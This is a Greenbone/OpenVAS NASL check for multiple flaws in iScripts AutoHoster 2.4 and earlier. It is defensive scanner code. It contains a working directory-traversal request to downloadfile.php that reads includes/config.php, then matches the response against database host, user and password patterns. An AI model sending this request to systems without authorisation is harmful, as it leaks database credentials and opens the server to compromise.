# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804165");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2013-7189", "CVE-2013-7190");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-12-31 11:25:53 +0530 (Tue, 31 Dec 2013)");
  script_name("iScripts AutoHoster <= 2.4 Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/89818");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64377");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/89816");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013120103");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2013/Dec/121");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2013/Dec/att-121/iscripts.txt");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/iscripts-autohoster-php-code-injection");

  script_tag(name:"summary", value:"iScripts AutoHoster is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"insight", value:"Multiple errors are due to:

  - Improper validation of user-supplied input to the 'checktransferstatus.php',
  'additionalsettings.php', 'payinvoiceothers.php' and 'checktransferstatusbck.php' scripts through
  unspecified parameters.

  - Input passed via the 'tmpid' parameter to the 'showtemplateimage.php' script, the 'fname'
  parameter to the 'downloadfile.php' script and the 'id' parameter to the 'csvdownload.php' script
  is not sanitised for requests using directory traversal attack (e.g., ../).

  - Improper validation of user-supplied input to the 'tldHoldList.php' script via the 'fa'
  parameter.");

  script_tag(name:"affected", value:"iScripts AutoHoster version 2.4 and probably prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the target system, obtain some sensitive information or execute arbitrary script code on
  the vulnerable server, perform SQL injection and compromise the application.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

foreach dir(make_list_unique("/", "/iscripts", "/autohoster", "/iscriptsautohoster", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  res = http_get_cache(item:dir + "/index.php", port:port);
  if(!res || res !~ "^HTTP/1\.[01] 200")
    continue;

  # Powered By <a href="https://www.iscripts.com/autohoster/" target="_blank" class="headingCopy">iScripts Autohoster.</a>
  if(egrep(pattern:"Powered By[^>]+>iScripts Autohoster", string:res, icase:FALSE)) {

    url = dir + "/admin/downloadfile.php?fname=../includes/config.php";

    if(http_vuln_check(port:port, url:url, icase:FALSE, pattern:"<?php", extra_check:make_list('HOST[^"]*"[^"]+"', 'DATABASE[^"]*"[^"]+"', 'USER[^"]*"[^"]+"', 'PASSWORD[^"]*"[^"]+"'))) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
